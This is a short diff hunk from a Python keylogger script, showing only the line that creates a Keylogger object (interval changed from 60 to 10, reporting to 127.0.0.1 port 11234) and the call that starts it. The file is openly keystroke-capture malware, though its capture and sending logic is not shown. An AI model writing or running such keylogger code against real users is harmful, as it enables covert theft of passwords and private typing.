@@ -82,6 +82,6 @@ class Keylogger:
 
 
 # adding a print interval of 10 seconds
-keylogger = Keylogger(60, "127.0.0.1", 11234, 10)
+keylogger = Keylogger(10, "127.0.0.1", 11234, 10)
 # starting the keyloggger
 keylogger.start()
